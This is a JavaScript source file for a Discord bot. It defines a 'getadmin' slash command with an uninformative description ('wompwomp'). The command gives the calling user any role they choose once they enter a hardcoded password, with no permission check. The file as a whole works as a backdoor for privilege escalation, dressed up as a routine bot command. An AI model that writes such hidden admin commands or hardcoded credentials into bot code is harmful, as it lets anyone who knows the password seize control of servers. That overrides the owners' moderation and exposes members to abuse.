const { SlashCommandBuilder } = require("discord.js");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("getadmin")
    .setDescription("wompwomp")
    .addStringOption((option) =>
      option
        .setName("password")
        .setDescription("The password")
        .setRequired(true)
    )
    .addRoleOption((option) =>
      option
        .setName("role")
        .setDescription("The role to give")
        .setRequired(true)
    ),
  async execute(interaction) {
    const password = interaction.options.getString("password");
    const role = interaction.options.getRole("role");

    if (password === "sex123") {
      await interaction.member.roles.add(role);
      await interaction.reply({
        content: "You are now an admin!",
        ephemeral: true,
      });
    } else {
      await interaction.reply({
        content: "Incorrect password!",
        ephemeral: true,
      });
    }
  },
};
